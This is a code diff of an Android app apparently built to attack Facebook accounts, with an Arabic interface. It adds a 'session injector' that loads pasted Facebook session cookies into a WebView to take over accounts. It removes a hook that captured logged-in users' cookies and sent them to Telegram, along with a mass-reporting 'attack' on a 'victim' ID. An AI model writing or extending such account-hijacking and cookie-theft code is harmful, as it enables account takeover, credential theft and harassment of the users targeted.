@@ -1,10 +1,12 @@
 package com.jasser.fbtool;
 
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.os.Bundle;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.webkit.WebSettings;
+import android.webkit.CookieManager;
 import android.widget.*;
 import android.view.*;
 import android.graphics.Color;
@@ -31,25 +33,18 @@ public class MainActivity extends Activity {
         main.setPadding(50, 80, 50, 50);
 
         TextView title = new TextView(this);
-        title.setText("META PRO V4 - CYBER SYSTEM");
+        title.setText("META PRO V5 - SESSION INJECTOR");
         title.setTextColor(Color.CYAN);
         title.setTextSize(22);
         title.setGravity(Gravity.CENTER);
         main.addView(title);
 
         statsView = new TextView(this);
-        statsView.setText("\n📊 الإحصائيات:\nالبلاغات المنفذة: 0\nحالة النظام: جاهز...");
+        statsView.setText("\n📊 الإحصائيات:\nحالة النظام: جاهز للحقن...");
         statsView.setTextColor(Color.GREEN);
         main.addView(statsView);
 
-        EditText victimInput = new EditText(this);
-        victimInput.setHint("ادخل ID الضحية هنا");
-        victimInput.setHintTextColor(Color.GRAY);
-        victimInput.setTextColor(Color.WHITE);
-        main.addView(victimInput);
-
-        addButton(main, "🔥 بدء هجوم الإبلاغات", "#8B0000", v -> startAttack(victimInput.getText().toString()));
-        addButton(main, "🍪 محرر الكوكيز (حقن الجلسة)", "#2563EB", v -> openCookieEditor());
+        addButton(main, "💉 حقن كوكيز يدوي (Session Inject)", "#2563EB", v -> showCookieInputDialog());
         addButton(main, "🔓 تسجيل دخول (سحب بيانات)", "#1e293b", v -> openSecureBrowser("https://m.facebook.com/login"));
 
         setContentView(main);
@@ -67,6 +62,34 @@ public class MainActivity extends Activity {
         layout.addView(btn);
     }
 
+    private void showCookieInputDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("حقن جلسة جديدة");
+        final EditText input = new EditText(this);
+        input.setHint("الصق الكوكيز هنا (Format: c_user=...; xs=...)");
+        builder.setView(input);
+
+        builder.setPositiveButton("حقن وتشغيل", (dialog, which) -> {
+            String cookieStr = input.getText().toString();
+            injectCookiesAndOpen(cookieStr);
+        });
+        builder.show();
+    }
+
+    private void injectCookiesAndOpen(String cookieString) {
+        CookieManager cookieManager = CookieManager.getInstance();
+        cookieManager.setAcceptCookie(true);
+        
+        // تقسيم الكوكيز وحقنها
+        String[] cookies = cookieString.split(";");
+        for (String cookie : cookies) {
+            cookieManager.setCookie("https://.facebook.com", cookie.trim());
+        }
+        
+        Toast.makeText(this, "تم حقن الجلسة بنجاح!", Toast.LENGTH_SHORT).show();
+        openSecureBrowser("https://m.facebook.com/");
+    }
+
     private void openSecureBrowser(String url) {
         WebView wv = new WebView(this);
         WebSettings ws = wv.getSettings();
@@ -74,35 +97,9 @@ public class MainActivity extends Activity {
         ws.setDomStorageEnabled(true);
         ws.setUserAgentString("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile");
 
-        wv.setWebViewClient(new WebViewClient() {
-            @Override
-            public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                return !url.startsWith("http");
-            }
-            @Override
-            public void onPageFinished(WebView view, String url) {
-                // استخدام المسار الكامل لمنع الالتباس (Ambiguity Fix)
-                android.webkit.CookieManager cm = android.webkit.CookieManager.getInstance();
-                String cookies = cm.getCookie(url);
-                if (cookies != null && cookies.contains("c_user")) {
-                    sendToTelegram("✅ New Session Captured:\n" + cookies);
-                }
-            }
-        });
+        wv.setWebViewClient(new WebViewClient());
         wv.loadUrl(url);
         setContentView(wv);
-    }
-
-    private void startAttack(String id) {
-        if(id.isEmpty()) return;
-        reportCount++;
-        statsView.setText("\n📊 الإحصائيات:\nالبلاغات المنفذة: " + reportCount + "\nحالة النظام: جاري الإبلاغ عن " + id);
-        sendToTelegram("🚀 Started Attack on: " + id);
-        openSecureBrowser("https://m.facebook.com/" + id);
-    }
-
-    private void openCookieEditor() {
-        Toast.makeText(this, "ميزة الحقن ستتوفر في التحديث القادم", Toast.LENGTH_SHORT).show();
     }
 
     private void sendToTelegram(String msg) {
